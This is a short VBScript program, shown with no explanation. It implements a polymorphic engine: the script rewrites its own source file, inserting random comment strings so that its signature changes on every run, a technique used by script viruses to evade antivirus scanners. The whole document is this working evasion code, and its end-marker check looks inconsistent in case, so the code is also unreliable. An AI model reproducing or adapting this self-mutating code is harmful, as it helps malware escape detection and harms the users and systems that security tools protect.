Randomize
for i = 1 to int(rnd * 20) + 3
  a = chr(int(rnd * 22) + 97)
  allchar = allchar & a
next
set fso = createobject("scripting.filesystemobject")
set op = fso.opentextfile(wscript.scriptfullname,1)
set parser = fso.Createtextfile("C:\poly.txt",true)
do while mark <> "'Markerz"
  mark = op.readline
  checker = mid(mark,1,4)
  if mark = lcase("'Markerz") or checker = lcase("ReM ") then poly = replace(mark,mark,mark)
  if checker <> lcase("ReM ") and mark <> lcase("'Markerz") then poly = replace(mark,mark,mark & "  '" & allchar & vbcrlf & "rem " & allchar)
  parser.writeline poly
loop
fso.copyfile "C:\poly.txt",wscript.scriptfullname
op.close
parser.close
'markerz